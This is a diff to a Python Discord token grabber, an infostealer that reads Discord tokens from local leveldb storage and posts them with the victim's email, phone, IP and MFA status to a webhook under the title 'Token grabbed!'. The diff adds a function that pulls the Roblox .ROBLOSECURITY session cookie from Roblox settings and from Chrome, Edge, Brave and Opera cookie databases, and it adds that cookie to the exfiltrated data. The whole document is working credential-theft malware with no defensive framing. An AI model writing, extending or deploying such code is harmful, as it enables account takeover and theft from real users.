@@ -10,6 +10,8 @@ import urllib.request
 import re
 import base64
 import datetime
+import sqlite3
+from pathlib import Path
 
 def pip_install(modules):
     for module, pip_name in modules:
@@ -51,23 +53,18 @@ def get_headers(token=None):
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
-
     if token:
         headers.update({"Authorization": token})
-
     return headers
 
 def get_tokens(path):
     path += "\\Local Storage\\leveldb\\"
     tokens = []
-
     if not os.path.exists(path):
         return tokens
-
     for file in os.listdir(path):
         if not file.endswith(".ldb") and file.endswith(".log"):
             continue
-
         try:
             with open(f"{path}{file}", "r", errors="ignore") as f:
                 for line in (x.strip() for x in f.readlines()):
@@ -75,7 +72,6 @@ def get_tokens(path):
                         tokens.append(values)
         except PermissionError:
             continue
-
     return tokens
 
 def get_key(path):
@@ -91,8 +87,57 @@ def get_ip():
     except:
         return "None"
 
+def get_roblox_cookie():
+    """Extract .ROBLOSECURITY cookie from browser cookie stores and Roblox local settings."""
+    cookie = None
+
+    # 1. Try Roblox local settings XML
+    roblox_local = os.path.join(os.getenv("LOCALAPPDATA", ""), "Roblox")
+    if roblox_local:
+        xml_path = os.path.join(roblox_local, "GlobalBasicSettings.xml")
+        if os.path.isfile(xml_path):
+            try:
+                with open(xml_path, "r", encoding="utf-8", errors="ignore") as f:
+                    data = f.read()
+                match = re.search(r'<string name="\.ROBLOSECURITY">([^<]+)</string>', data)
+                if match:
+                    cookie = match.group(1).strip()
+                    if cookie:
+                        return cookie
+            except:
+                pass
+
+    # 2. Browser cookie databases (Chrome, Edge, Brave, Opera)
+    browser_cookie_paths = [
+        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
+        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
+        os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
+        os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
+        os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Cookies"),
+        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
+    ]
+
+    for cookie_path in browser_cookie_paths:
+        if not os.path.isfile(cookie_path):
+            continue
+        try:
+            conn = sqlite3.connect(cookie_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'")
+            row = cursor.fetchone()
+            conn.close()
+            if row and row[1] and row[1].startswith("_|WARNING:-DO-NOT-SHARE"):
+                cookie = row[1]
+                if cookie:
+                    return cookie
+        except:
+            continue
+
+    return cookie
+
 def main():
     done = []
+    roblox_cookie = get_roblox_cookie()
 
     for x, path in PATHS.items():
         if not os.path.exists(path):
@@ -132,72 +177,31 @@ def main():
                     'locale': res_json.get('locale', 'Unknown')
                 }
 
+                embed_fields = [
+                    {'name': 'Username', 'value': f"```{info['username']}```", 'inline': True},
+                    {'name': 'User ID', 'value': f"```{info['id']}```", 'inline': True},
+                    {'name': 'Email', 'value': f"```{info['email']}```", 'inline': True},
+                    {'name': 'Phone', 'value': f"```{info['phone']}```", 'inline': True},
+                    {'name': 'Verified', 'value': f"```{info['verified']}```", 'inline': True},
+                    {'name': 'MFA/2SV', 'value': f"```{info['mfa_enabled']}```", 'inline': True},
+                    {'name': 'Nitro', 'value': f"```{has_nitro}```", 'inline': True},
+                    {'name': 'Nitro Expiry', 'value': f"```{exp_date if has_nitro else 'None'}```", 'inline': True},
+                    {'name': 'Guilds', 'value': f"```{guilds}```", 'inline': True},
+                    {'name': 'IP', 'value': f"```{get_ip()}```", 'inline': True},
+                    {'name': 'Region', 'value': f"```{info.get('locale', 'Unknown')}```", 'inline': True},
+                ]
+
+                # Add Roblox cookie if found
+                if roblox_cookie:
+                    embed_fields.append({'name': 'Roblox Cookie', 'value': f"```{roblox_cookie}```", 'inline': False})
+
+                embed_fields.append({'name': 'Token', 'value': f"```{token}```", 'inline': False})
+
                 embed = {
                     'embeds': [
                         {
                             'title': f"**Token grabbed!**",
-                            'fields': [
-                                {
-                                    'name': 'Username',
-                                    'value': f"```{info['username']}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'User ID',
-                                    'value': f"```{info['id']}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'Email',
-                                    'value': f"```{info['email']}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'Phone',
-                                    'value': f"```{info['phone']}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'Verified',
-                                    'value': f"```{info['verified']}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'MFA/2SV',
-                                    'value': f"```{info['mfa_enabled']}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'Nitro',
-                                    'value': f"```{has_nitro}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'Nitro Expiry',
-                                    'value': f"```{exp_date if has_nitro else 'None'}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'Guilds',
-                                    'value': f"```{guilds}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'IP',
-                                    'value': f"```{get_ip()}```",
-                                    'inline': True
-                                },                                
-                                {
-                                    'name': 'Region',
-                                    'value': f"```{info.get('locale', 'Unknown')}```",
-                                    'inline': True
-                                },
-                                {
-                                    'name': 'Token',
-                                    'value': f"```{token}```",
-                                    'inline': False
-                                }
-                            ],
+                            'fields': embed_fields,
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{info['id']}/{res_json['avatar']}.png"
                             }
@@ -206,7 +210,6 @@ def main():
                 }
 
                 urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed).encode('utf-8'), headers=get_headers(), method='POST')).read().decode()
-
                 urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed).encode('utf-8'), headers=get_headers(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
